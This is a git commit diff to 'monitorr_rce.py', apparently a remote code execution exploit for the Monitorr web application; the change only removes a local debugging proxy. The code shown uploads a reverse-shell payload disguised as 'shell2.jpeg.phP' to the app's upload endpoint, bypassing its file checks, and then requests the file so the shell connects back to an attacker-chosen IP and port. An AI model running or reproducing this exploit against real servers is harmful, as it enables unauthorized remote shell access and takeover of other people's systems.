e44fcc53b7d8b3b4d4bd2e4388fc9ce99bf78b77
valentinodev <70417739+valentinodev@users.noreply.github.com>
2021-04-27 17:21:22 -0300

    Update monitorr_rce.py

--- monitorr_rce.py
+++ monitorr_rce.py
@@ -14,8 +14,6 @@ import requests
 import os
 import sys
 
-proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
-
 host = sys.argv[1]
 ip_address = sys.argv[2]
 port = sys.argv[3]
@@ -40,12 +38,12 @@ def exploit():
                 url = host + "/assets/php/upload.php"
                 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Cookie": "isHuman=1","Referer": host}
                 data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"shell2.jpeg.phP\"\r\nContent-Type: image/jpeg\r\n\r\n" + reverse_shell +"\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
-                requests.post(url, headers=headers, data=data, proxies=proxies, verify=False)
+                requests.post(url, headers=headers, data=data, verify=False)
 
                 # Send GET Request
                 url = host + "/assets/data/usrimg/shell2.jpeg.php"
                 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Cookie": "isHuman=1","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
-                requests.get(url, headers=headers, proxies=proxies, verify=False)
+                requests.get(url, headers=headers, verify=False)
 
 if __name__ == '__main__':
         generate_shell()
